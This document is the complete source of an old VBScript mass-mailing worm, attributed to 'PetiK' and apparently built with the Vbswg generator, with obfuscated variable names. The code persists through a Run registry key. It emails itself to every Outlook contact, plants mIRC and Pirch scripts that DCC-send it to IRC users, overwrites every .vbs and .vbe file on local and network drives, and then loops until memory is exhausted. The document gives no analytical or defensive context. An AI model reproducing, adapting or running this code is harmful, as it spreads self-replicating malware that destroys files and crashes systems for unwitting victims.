'Vbs.EMM Created By PetiK
On Error Resume Next
Set kicmhdkpgga= Createobject("scripting.filesystemobject")
kicmhdkpgga.copyfile wscript.scriptfullname,kicmhdkpgga.GetSpecialFolder(1)& "\EMM.vbs"
Set tgsyfwexamh = CreateObject("WScript.Shell")
tgsyfwexamh.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM","wscript.exe "&kicmhdkpgga.GetSpecialFolder(1)& "\EMM.vbs %"
if tgsyfwexamh.regread ("HKCU\software\EMM\mailed") <> "1" then
ebkjufsvtya()
end if
if tgsyfwexamh.regread ("HKCU\software\EMM\mirqued") <> "1" then
hstydapwgqa ""
end if
if tgsyfwexamh.regread ("HKCU\software\EMM\pirched") <> "1" then
xrhmmlogdgv ""
end if
ccklnjvdzri()
isgipvfmfzm= 1
Do
ReDim Preserve xxlckdfsfli(isgipvfmfzm)
rqbmyusyhoz= CLng(1024)
xxlckdfsfli(isgipvfmfzm) = String(rqbmyusyhoz* rqbmyusyhoz, ".")
isgipvfmfzm = isgipvfmfzm + 1
Loop
Function ebkjufsvtya()
On Error Resume Next
Set txjhvwmxzdy = CreateObject("Outlook.Application")
If txjhvwmxzdy= "Outlook"Then
Set ostsugjncji=txjhvwmxzdy.GetNameSpace("MAPI")
For Each qstpcjgypqa In ostsugjncji.AddressLists
If qstpcjgypqa.AddressEntries.Count <> 0 Then
tdsfnaotqzr = qstpcjgypqa.AddressEntries.Count
For orywnuhhuzf= 1 To tdsfnaotqzr
Set cuacbgpwabg = txjhvwmxzdy.CreateItem(0)
Set rpdevyhmgwu = qstpcjgypqa.AddressEntries(orywnuhhuzf)
cuacbgpwabg.To = rpdevyhmgwu.Address
cuacbgpwabg.Subject = "Here you have, ;o)"
cuacbgpwabg.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
utwosvdrqyt.Add kicmhdkpgga.GetSpecialFolder(1)& "\EMM.vbs"
cuacbgpwabg.DeleteAfterSubmit = True
If cuacbgpwabg.To <> "" Then
cuacbgpwabg.Send
tgsyfwexamh.regwrite "HKCU\software\EMM\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function hstydapwgqa(vrdshgxrbxs)
On Error Resume Next
if vrdshgxrbxs = "" then
if kicmhdkpgga.fileexists("c:\mirc\mirc.ini") then vrdshgxrbxs="c:\mirc"
if kicmhdkpgga.fileexists("c:\mirc32\mirc.ini") then vrdshgxrbxs="c:\mirc32"
zewvppdhnbl=tgsyfwexamh.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if kicmhdkpgga.fileexists(zewvppdhnbl & "\mirc\mirc.ini") then vrdshgxrbxs=zewvppdhnbl & "\mirc"
end if
if vrdshgxrbxs <> "" then
set bnwcwvrbzlc = kicmhdkpgga.CreateTextFile(vrdshgxrbxs & "\script.ini", True)
bnwcwvrbzlc.WriteLine "[script]"
bnwcwvrbzlc.writeline "n0=on 1:JOIN:#:{"
bnwcwvrbzlc.writeline "n1=  /if ( $nick == $me ) { halt }"
bnwcwvrbzlc.writeline "n2=  /.dcc send $nick "&kicmhdkpgga.GetSpecialFolder(1)& "\EMM.vbs"
bnwcwvrbzlc.writeline "n3=}"
bnwcwvrbzlc.close
tgsyfwexamh.regwrite "HKCU\software\EMM\Mirqued", "1"
end if
end function
function xrhmmlogdgv(iljpxyijoaq)
On Error Resume Next
if iljpxyijoaq="" then
if kicmhdkpgga.fileexists("c:\pirch\Pirch32.exe") then iljpxyijoaq="c:\pirch"
if kicmhdkpgga.fileexists("c:\pirch32\Pirch32.exe") then iljpxyijoaq="c:\pirch32"
fndgquoeccb=tgsyfwexamh.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if kicmhdkpgga.fileexists(fndgquoeccb & "\pirch\Pirch32.exe") then iljpxyijoaq=fndgquoeccb & "\pirch\Pirch32.exe"
end if
if iljpxyijoaq <> "" then
set ewtwmzsacdz= kicmhdkpgga.CreateTextFile(iljpxyijoaq & "\events.ini", True)
ewtwmzsacdz.WriteLine "[Levels]"
ewtwmzsacdz.WriteLine "Enabled=1"
ewtwmzsacdz.WriteLine "Count=6"
ewtwmzsacdz.WriteLine "Level1=000-Unknowns"
ewtwmzsacdz.WriteLine "000-UnknownsEnabled=1"
ewtwmzsacdz.WriteLine "Level2=100-Level 100"
ewtwmzsacdz.WriteLine "100-Level 100Enabled=1"
ewtwmzsacdz.WriteLine "Level3=200-Level 200"
ewtwmzsacdz.WriteLine "200-Level 200Enabled=1"
ewtwmzsacdz.WriteLine "Level4=300-Level 300"
ewtwmzsacdz.WriteLine " 300-Level 300Enabled=1"
ewtwmzsacdz.WriteLine "Level5=400-Level 400 "
ewtwmzsacdz.WriteLine "400-Level 400Enabled=1"
ewtwmzsacdz.WriteLine "Level6=500-Level 500"
ewtwmzsacdz.WriteLine "500-Level 500Enabled=1"
ewtwmzsacdz.WriteLine ""
ewtwmzsacdz.WriteLine "[000-Unknowns]"
ewtwmzsacdz.WriteLine "UserCount=0"
ewtwmzsacdz.WriteLine "EventCount=0"
ewtwmzsacdz.WriteLine ""
ewtwmzsacdz.WriteLine "[100-Level 100]"
ewtwmzsacdz.WriteLine "User1=*!*@*"
ewtwmzsacdz.WriteLine "UserCount=1"
ewtwmzsacdz.writeline "Event1=ON JOIN:#:/dcc tsend $nick " & kicmhdkpgga.GetSpecialFolder(1) & "\EMM.vbs"
ewtwmzsacdz.WriteLine "EventCount=1"
ewtwmzsacdz.WriteLine ""
ewtwmzsacdz.WriteLine "[200-Level 200]"
ewtwmzsacdz.WriteLine "UserCount=0"
ewtwmzsacdz.WriteLine "EventCount=0"
ewtwmzsacdz.WriteLine ""
ewtwmzsacdz.WriteLine "[300-Level 300]"
ewtwmzsacdz.WriteLine "UserCount=0"
ewtwmzsacdz.WriteLine "EventCount=0"
ewtwmzsacdz.WriteLine ""
ewtwmzsacdz.WriteLine "[400-Level 400]"
ewtwmzsacdz.WriteLine "UserCount=0"
ewtwmzsacdz.WriteLine "EventCount=0"
ewtwmzsacdz.WriteLine ""
ewtwmzsacdz.WriteLine "[500-Level 500]"
ewtwmzsacdz.WriteLine "UserCount=0"
ewtwmzsacdz.WriteLine "EventCount=0"
ewtwmzsacdz.close
tgsyfwexamh.regwrite "HKCU\software\EMM\pirched", "1"
end if
end function
Function ccklnjvdzri()
On Error Resume Next
Set laphfzkfahm = kicmhdkpgga.Drives
For Each eexqepvdtcv In laphfzkfahm
If eexqepvdtcv.Drivetype = Remote Then
xkedajhteqt= eexqepvdtcv & "\"
Call rxygrrwbynv(xkedajhteqt)
ElseIf eexqepvdtcv.IsReady Then
xkedajhteqt= eexqepvdtcv&"\"
Call rxygrrwbynv(xkedajhteqt)
End If
Next
End Function
Function rxygrrwbynv(eoyvqgkkkmf)
Set bfuaaiklhub= kicmhdkpgga.GetFolder(eoyvqgkkkmf)
Set xqgisgipvfm= bfuaaiklhub.Files
For Each fzmxxlckdfs In xqgisgipvfm
if kicmhdkpgga.GetExtensionName(fzmxxlckdfs.path) = "vbs" then
kicmhdkpgga.copyfile wscript.scriptfullname , fzmxxlckdfs.path , true
end if
if kicmhdkpgga.GetExtensionName(fzmxxlckdfs.path) = "vbe" then
kicmhdkpgga.copyfile wscript.scriptfullname , fzmxxlckdfs.path , true
end if
if fzmxxlckdfs.name = "mirc.ini" then
hstydapwgqa(fzmxxlckdfs.ParentFolder)
end if
Next
Set fzmxxlckdfs= bfuaaiklhub.SubFolders
For Each flirqbmyusy In fzmxxlckdfs
Call rxygrrwbynv(flirqbmyusy.path)
Next
End Function
'Vbswg 1.0. [K]Alamar.
